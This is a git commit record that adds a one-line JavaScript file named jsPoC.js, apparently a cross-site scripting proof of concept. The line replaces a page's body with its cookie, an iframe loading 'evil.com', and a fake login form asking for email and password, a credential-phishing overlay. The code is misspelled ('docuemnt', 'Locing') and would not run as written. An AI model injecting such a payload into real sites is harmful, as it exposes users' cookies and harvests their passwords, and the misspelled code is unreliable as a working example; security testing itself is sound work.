dee57539b021aa5e087e8dcd0fcb071c4412d65c
mrx_w_ <96743453+abx12@users.noreply.github.com>
2024-11-04 20:42:42 +0100

    Create jsPoC.js

---
+++ jsPoC.js
@@ -0,0 +1,1 @@
+docuemnt.body.innerHTML=docuemnt.cookie+"<iframe src='https://evil.com'></iframe>;<br/><h1>Locing</h1><br/><input placeholder='Email'><br/><input placeholder='Password'><br/><button>Login</button>"
